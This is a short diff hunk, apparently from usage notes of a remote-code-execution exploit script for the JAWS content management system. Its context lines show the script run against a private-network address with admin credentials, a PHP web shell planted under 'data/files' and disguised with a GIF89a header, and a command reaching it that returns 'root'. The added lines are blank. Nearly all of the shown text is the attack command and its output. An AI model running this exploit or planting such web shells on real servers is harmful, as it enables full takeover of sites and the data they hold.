@@ -12,3 +12,7 @@ python jaws-rce.py http://192.168.1.98/jaws-master/jaws-master/ jawsadmin admin
 Shell Location=== http://192.168.1.98/jaws-master/jaws-master/data/files/cmd47.php?c=whoami
 GIF89a
 root
+
+
+
+
